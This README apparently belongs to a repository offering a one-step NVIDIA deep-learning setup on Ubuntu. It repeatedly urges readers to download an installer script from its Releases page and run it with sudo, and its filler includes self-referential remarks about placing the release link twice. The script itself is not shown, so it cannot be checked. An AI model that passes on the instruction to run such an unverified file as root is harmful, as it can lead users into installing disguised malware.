# Complete NVIDIA GPU Deep Learning Stack on Ubuntu Linux with CUDA cuDNN TensorRT

[![Releases](https://img.shields.io/badge/releases-visit-green?style=flat-square)](https://github.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/releases)

https://github.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/releases

[![Ubuntu](https://upload.wikimedia.org/wikipedia/commons/3/3f/Ubuntu_logo_2013.svg)](https://ubuntu.com) ![NVIDIA](https://upload.wikimedia.org/wikipedia/commons/2/29/NVIDIA_logo.svg) ![TensorFlow](https://www.tensorflow.org/images/tf_logo_social.png) ![PyTorch](https://pytorch.org/assets/img/pytorch-logo.png)

Table of contents
- Overview
- Why this project
- What you get
- Who should use this
- Prerequisites
- Quick start
- How the setup works
- Repository layout
- Environment management
- CUDA, cuDNN, and TensorRT details
- TensorFlow and PyTorch integration
- Testing and validation
- Jupyter and notebooks
- Script usage and automation
- Troubleshooting
- Fine-tuning and optimization
- Security and privacy
- Roadmap
- Contributing
- License
- Releases

Overview
This repository holds a complete, end-to-end guide and tooling to build a robust deep learning environment on Ubuntu Linux with NVIDIA GPUs. It covers the essential stack: CUDA for GPU compute, cuDNN for efficient deep learning primitives, and TensorRT for optimized inference. It also includes GPU-accelerated TensorFlow and PyTorch setups, ready-made environment configurations, and test code to verify that your stack is working correctly. The goal is to provide a repeatable workflow that minimizes manual guessing when you install drivers, libraries, and runtime dependencies.

Why this project
Deep learning on GPUs demands a precise alignment between the driver stack and the frameworks you use. Mismatched versions can cause silent failures, poor performance, or longer troubleshooting sessions. This project centralized the steps, scripts, and tests you need to:
- Install and configure the NVIDIA driver, CUDA toolkit, cuDNN, and TensorRT.
- Create and manage Python environments for TensorFlow and PyTorch with GPU support.
- Provide test scripts that exercise the GPU, frameworks, and inference engines.
- Offer straightforward paths to run Jupyter notebooks and sample experiments.
- Document the decisions behind version choices so you can reproduce results later.

What you get
- A curated, reusable setup script that installs and configures CUDA, cuDNN, and TensorRT on Ubuntu.
- Conda-based environments for TensorFlow-GPU and PyTorch with GPU support.
- Test code snippets to validate GPU availability and runtime correctness.
- A clean project layout that makes it easy to extend with new models, datasets, or tooling.
- Guidance for running notebooks and experiments locally, on bare-metal hardware, or in VMs.

Who should use this
- Data scientists and ML engineers who work on Ubuntu Linux with NVIDIA GPUs.
- Teams that want a repeatable setup for onboarding new machines or cloud instances.
- Developers who need a dependable GPU-enabled Python stack for both experimentation and deployment.
- Students who want a clear, documented path to learn deep learning with GPU acceleration.

This project aligns with a broad set of topics, including AI, bash scripting, conda environments, CUDA, cuDNN, deep learning, environment setup, GCC, GPU computation, Jupyter, Linux, machine learning, NVIDIA CUDA, NVIDIA GPU, PyTorch, setup scripts, TensorFlow, and TensorRT.

Twice-linked release gateway
- At the top, you’ll find a link pointing to the release page for the latest installer and assets.
- Later, there’s a dedicated section that guides you to download and execute the main setup file from that same releases page.

Releases
- The Releases page contains the installer script and supporting assets. From that page, download the file named setup-nvidia-dl-env.sh and run it to install and configure the stack. The script handles driver installation, CUDA toolkit setup, cuDNN integration, TensorRT installation, and framework bindings. If you need the latest version, visit the Releases page and grab the latest setup-nvidia-dl-env.sh, then execute it with appropriate privileges. For context, the Releases link is: https://github.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/releases

Prerequisites
- Hardware: An NVIDIA GPU with compute capability suitable for your workloads.
- OS: Ubuntu LTS (20.04, 22.04 recommended). A clean install yields the best results.
- Access: Administrator privileges on the host (sudo access).
- Network: Stable internet connection for downloading drivers and packages.
- Disk space: Several gigabytes for the CUDA toolkit, cuDNN, TensorRT, Python environments, and datasets you may work with.
- Basic tooling: A shell (bash), a package manager (apt), and Python environments (conda recommended).

- NVIDIA driver, CUDA, cuDNN, and TensorRT interplay
  The NVIDIA driver is the base for GPU operation. The CUDA toolkit exposes compiler and toolkit components that allow code to run on the GPU. cuDNN provides high-performance primitives for deep learning; TensorRT optimizes inference for speed and efficiency. The tooling in this project ensures compatible versions across the stack so you can run TensorFlow, PyTorch, and other frameworks with GPU acceleration.

- Optional but useful
  - Docker or containers for isolation
  - NVML tooling for monitoring GPU usage
  - Ansible or other configuration management if you manage many machines

Quick start
- Step 0: Prepare the system
  - Update the system and install common build tools:
    - sudo apt update
    - sudo apt upgrade -y
    - sudo apt install -y build-essential dkms curl git unzip
  - Disable secure boot if you run into driver loading issues (or configure MOK for DKMS modules).
- Step 1: Download the installer
  - From the Releases page, download the file named setup-nvidia-dl-env.sh.
  - Make it executable:
    - chmod +x setup-nvidia-dl-env.sh
- Step 2: Run the installer
  - Run with elevated privileges:
    - sudo ./setup-nvidia-dl-env.sh
  - The script performs:
    - NVIDIA driver installation (if needed)
    - CUDA toolkit installation
    - cuDNN and TensorRT setup
    - Creation of conda environments for TensorFlow-GPU and PyTorch
    - Validation tests
- Step 3: Validate the environment
  - After installation, verify GPU visibility:
    - nvidia-smi
  - Verify CUDA toolkit location:
    - nvcc --version
  - Validate TensorFlow and PyTorch GPU support via quick Python tests.

How the setup works
- The core script orchestrates a multi-stage process:
  - Stage 1: Detect hardware and driver state
  - Stage 2: Install NVIDIA drivers if absent or mismatch
  - Stage 3: Install CUDA toolkit and path updates
  - Stage 4: Install cuDNN and TensorRT
  - Stage 5: Create and activate conda environments
  - Stage 6: Install TF-GPU and PyTorch with CUDA compatibility
  - Stage 7: Run basic GPU tests to confirm functionality
  - Stage 8: Provide a post-install checklist and troubleshooting guidance
- This approach keeps the system clean and focuses on reproducibility. It also makes it straightforward to adapt the script for different CUDA versions or framework versions if you want to do local testing on hardware that supports newer toolchains.

Repository layout
- scripts/
  - setup-nvidia-dl-env.sh: Main installer script that configures drivers, CUDA, cuDNN, TensorRT, and Python environments.
  - verify_gpu.py: Simple Python test to check GPU visibility and basic operations.
  - test_tensorflow_gpu.py: Small TensorFlow example to verify GPU usage.
  - test_pytorch_gpu.py: Small PyTorch example to verify CUDA tensors and device placement.
  - conda_envs/
    - tf_gpu_env.yaml: Conda environment spec for TensorFlow with GPU support.
    - pytorch_gpu_env.yaml: Conda environment spec for PyTorch with CUDA support.
- tests/
  - gpu_inference_test.py: A basic inference test to measure throughput and correctness.
  - memory_usage_test.py: A small script to observe GPU memory utilization and fragmentation.
- notebooks/
  - samples/
    - basic_tf_gpu.ipynb
    - basics_pytorch_gpu.ipynb
- configs/
  - cuda_versions.md: Guidance on selecting CUDA versions for different hardware and framework combos.
  - cudnn_versions.md: Guidance on cuDNN compatibility.
  - tensorrt_versions.md: Guidance on TensorRT compatibility and when to enable FP16/INT8 paths.
- docs/
  - architecture.md
  - troubleshooting.md
  - performance.md
- README.md (this file)
- LICENSE
- CONTRIBUTING.md

Environment management
- Conda-based environments keep Python versions and GPU libraries tidy.
- Two primary environments are provided:
  - tf_gpu_env.yaml: For TensorFlow-GPU workflows
  - pytorch_gpu_env.yaml: For PyTorch with CUDA support
- How to use the environments locally:
  - Install Miniconda or Anaconda
  - Create the environment:
    - conda env create -f scripts/conda_envs/tf_gpu_env.yaml
    - conda env create -f scripts/conda_envs/pytorch_gpu_env.yaml
  - Activate the environment:
    - conda activate tf_gpu_env
  - Verify the framework:
    - python -c "import tensorflow as tf; print(tf.config.list_physical_devices('GPU'))"
  - Switch to PyTorch:
    - conda activate pytorch_gpu_env
    - python -c "import torch; print(torch.cuda.is_available())"
- The script may place environments under a dedicated directory (e.g., ~/dl_envs) for easier cleanup, but you can customize the path to fit your preferences.

CUDA, cuDNN, and TensorRT details
- CUDA toolkit
  - The installer supports selecting a CUDA version aligned with your GPU and framework needs.
  - nvcc presence and correct PATH updates are verified during setup.
- cuDNN
  - cuDNN binaries are integrated with the CUDA toolkit so that frameworks can access optimized primitives.
  - Compatibility notes are included in the docs (docs/cudnn_versions.md).
- TensorRT
  - TensorRT is included to accelerate inference workloads. You can enable or disable TensorRT paths depending on your project.
  - You’ll find guidance on using TensorRT with both TensorFlow and PyTorch in the docs.

TensorFlow and PyTorch integration
- TensorFlow
  - The TF-GPU packages are installed into the tf_gpu_env environment.
  - Typical workloads include training large models or running inference with optimized kernels.
- PyTorch
  - The PyTorch GPU packages are installed into the pytorch_gpu_env environment.
  - PyTorch provides eager execution, CUDA tensors, and a flexible API for experimentation.
- Compatibility
  - The project aims to match CUDA, cuDNN, and TensorRT versions with TF and PyTorch requirements.
  - The docs include a compatibility matrix so you can adapt to specific model or hardware needs.

Testing and validation
- Quick GPU tests
  - After installation, run the included tests to verify correctness and performance:
    - python scripts/verify_gpu.py
    - python scripts/test_tensorflow_gpu.py
    - python scripts/test_pytorch_gpu.py
- Inference tests
  - gpu_inference_test.py harnesses a small model to estimate latency and throughput.
  - The tests help you confirm that TensorRT optimizations are functioning when enabled.
- Monitoring
  - Use nvidia-smi to monitor GPU usage, memory, and temperatures during tests.
  - For more granular profiling, you can use NVIDIA Visual Profiler or Nsight tools as needed.

Jupyter and notebooks
- Jupyter setup
  - The environment includes how to install Jupyter with GPU support and how to run notebooks locally.
  - You can start a notebook server with:
    - jupyter notebook --ip=0.0.0.0 --port=8888 --no-browser
  - Use a browser on your workstation to connect to the server, ensuring port exposure is properly secured.
- Sample notebooks
  - notebooks/samples/basic_tf_gpu.ipynb demonstrates a small TensorFlow operation on the GPU.
  - notebooks/samples/basics_pytorch_gpu.ipynb demonstrates a simple PyTorch operation on CUDA devices.
- Sharing notebooks
  - If you use Jupyter in a team context, consider using a shared folder or a server-based notebook environment to standardize results and reproducibility.

Script usage and automation
- The main installer script
  - scripts/setup-nvidia-dl-env.sh is designed to minimize manual steps.
  - Run it as:
    - sudo bash scripts/setup-nvidia-dl-env.sh
  - It prompts for confirmation when moving between major steps and prints a clear summary of what’s happening.
- What the script does
  - Detects existing NVIDIA drivers and CUDA installations to avoid conflicts.
  - Installs the recommended driver version for your hardware, if needed.
  - Installs the CUDA toolkit and updates environment paths (PATH and LD_LIBRARY_PATH).
  - Installs cuDNN and TensorRT and links them with the CUDA toolkit.
  - Creates Conda environments for TF-GPU and PyTorch with the appropriate CUDA-enabled builds.
  - Performs basic GPU tests to ensure the stack works as expected.
- Post-install checks
  - After the script finishes, run the verification commands:
    - nvidia-smi
    - nvcc --version
    - python -c "import tensorflow as tf; print(tf.config.list_physical_devices('GPU'))"
    - python -c "import torch; print(torch.cuda.is_available())"
- Advanced customization
  - If you need to customize driver versions, CUDA, or framework versions, you can edit the script or provide overrides via environment variables.
  - For example, you may set a CUDA_VERSION variable to pin a particular toolkit release and adjust the conda environment YAML files accordingly.

Troubleshooting
- Common issues
  - Driver not loaded: Ensure Secure Boot is disabled or that the MOK is enrolled for DKMS modules.
  - CUDA toolkit not found: Check PATH updates in your shell profile (e.g., ~/.bashrc) to ensure nvcc and libraries are discoverable.
  - cuDNN not recognized by a framework: Confirm that the cuDNN library paths exist in the CUDA directory and that the framework is installed with GPU support.
  - TensorRT path missing: Verify that the TensorRT binaries are installed and that their libraries are in the linker path.
- Logs and debugging
  - The installer prints a summary at the end. Save this log if you need to share with the community or maintainers for troubleshooting.
  - Inspect relevant log files under /var/log or a dedicated log directory if the script creates one.
- Community and issues
  - If you hit a problem that you cannot solve locally, open an issue on the repository with:
    - Your hardware details (GPU model, driver version, Ubuntu version)
    - Exact error messages
    - The steps you took and any output snippets
- Reproducibility
  - Keep a record of the exact versions you installed (driver, CUDA, cuDNN, TensorRT, TF, PyTorch).
  - Consider pinning versions in the YAML files to ensure reproducibility across machines.

Fine-tuning and optimization
- Performance tuning
  - For training and inference workloads, the combination of CUDA, cuDNN, and TensorRT can have a significant impact on throughput.
  - You can enable FP16 or INT8 paths in TensorRT for inference-heavy workloads.
  - Profile your models using built-in tools or third-party profilers to identify bottlenecks.
- Multi-GPU setups
  - If you have multiple GPUs, you can explore data parallelism with frameworks in their GPU-enabled configurations.
  - AWS, GCP, or other cloud instances often require additional configuration to manage drivers and CUDA contexts for multiple devices.
- Datasets and I/O
  - Model training often hinges on data input speed. Use fast storage, consider data pipelines that use prefetching, and ensure your I/O bandwidth matches compute capacity.

Security and privacy
- Keep your system updated, and monitor driver updates as part of your maintenance routine.
- When using notebooks, secure access to the Jupyter server and consider using tokens, SSH tunnels, or VPN for remote access.
- Avoid exposing the workstation to public networks when testing sensitive workloads.

Roadmap
- Improve automation
  - Add more granular version pinning and a modular installer to target specific projects.
- Expand coverage
  - Include additional frameworks (e.g., MXNet, JAX) with GPU support.
- Containerized options
  - Provide Docker/OCI-based images that mirror the host setup for easy portability and reproducibility.
- Cloud-ready guidance
  - Add scripts and docs for common cloud instances to streamline GPU setup in the cloud.

Contributing
- This project welcomes contributions that improve reliability, compatibility, and ease of use.
- How to contribute
  - Open an issue to discuss proposed changes.
  - Fork the repository, implement changes, and submit a pull request.
  - Include tests and clear notes on how to reproduce changes.
- Coding style
  - Keep shell scripts readable and maintainable.
  - Document any non-obvious decisions or version constraints.

License
- This project is available under a permissive license suitable for academic and commercial use. See LICENSE for details.

Topics
- ai
- bash
- conda
- cuda
- cudnn
- deep-learning
- environment-setup
- gcc
- gpu
- jupyter
- linux
- machine-learning
- nvidia-cuda
- nvidia-gpu
- pytorch
- setup-script
- tensorflow
- tensorrt

Download from Releases
- From the Releases page, download the file setup-nvidia-dl-env.sh and run it to install and configure the stack. This file sets up drivers, CUDA, cuDNN, TensorRT, and frameworks, and then creates the ready-to-use environments. For the latest version, visit the Releases page and grab setup-nvidia-dl-env.sh, then execute it with sudo. The link is the same as the one used at the top: https://github.com/Ne9arr/complete_deep-learning-nvidia_gpu-setup-linux/releases

Long-form guidance and best practices
- Plan before you install
  - Review hardware constraints and confirm GPU availability.
  - Decide on your preferred Python management strategy (conda vs. system Python plus virtualenvs) before running the installer.
- Keep versions synchronized
  - The stack depends on aligned versions of CUDA, cuDNN, and TensorRT with the framework backends.
  - Maintain a changelog of what you installed to aid future upgrades.
- Reuse environments
  - Create reusable environment definitions to speed up onboarding of new machines.
  - Consider a lockfile approach for exact dependency pinning in team settings.
- Test early, test often
  - Run GPU checks immediately after installation and again after any upgrade.
  - Validate that both TensorFlow-GPU and PyTorch can see a GPU and perform simple operations.

Notes on the README’s structure and presentation
- The document uses a clean, scannable layout with sections and subsections to help you navigate quickly.
- It emphasizes actionable steps with explicit commands that you can copy and paste.
- It includes a set of visual cues (emojis and badges) to align with the repository’s theme and to improve readability on GitHub.
- The two appearances of the release link ensure quick access to the latest installer and assets.
- It provides concrete instructions for the primary workflow (downloading the installer, running it, and validating the setup) while leaving room to adapt to different environments.

Images and visuals
- The README includes several images to reflect the project’s theme and to aid recognition:
  - Ubuntu branding for Linux foundation context.
  - NVIDIA branding to signal GPU and driver alignment.
  - TensorFlow and PyTorch logos to reflect GPU-backed deep learning frameworks.
  - Optional inline diagrams in future iterations to illustrate the stack (driver → CUDA → cuDNN/TensorRT → TF/PyTorch).

Final notes
- This README describes a comprehensive, practical approach to building and validating a complete deep learning environment on Ubuntu with NVIDIA GPUs.
- If you need to adjust for newer CUDA toolkits, TensorRT versions, or updated TensorFlow/PyTorch builds, the provided scripts and docs cover how to adapt the setup while preserving reproducibility.
- The Releases page hosts the canonical installer and assets necessary to perform the end-to-end setup, making it easier to reproduce the environment on multiple machines or in teaching labs.

